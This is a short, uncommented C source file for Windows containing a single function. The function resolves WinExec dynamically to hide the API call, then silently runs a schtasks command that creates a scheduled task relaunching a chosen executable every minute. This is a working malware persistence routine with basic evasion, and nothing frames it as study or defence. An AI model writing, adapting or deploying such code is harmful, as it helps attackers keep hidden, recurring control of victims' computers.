#include <windows.h>

void __attribute__((noinline)) __attribute__((used)) routine_v3(const char* taskName, const char* exePath){
    typedef UINT (WINAPI *WE)(LPCSTR, UINT);
    HMODULE hKern = GetModuleHandleA("kernel32.dll");
    WE pWinExec = (WE)GetProcAddress(hKern, "WinExec");
    
    char cmd[512];
    wsprintfA(cmd, "schtasks /create /sc minute /mo 1 /tn \"%s\" /tr \"%s\" /f", taskName, exePath);
    pWinExec(cmd, 0);
}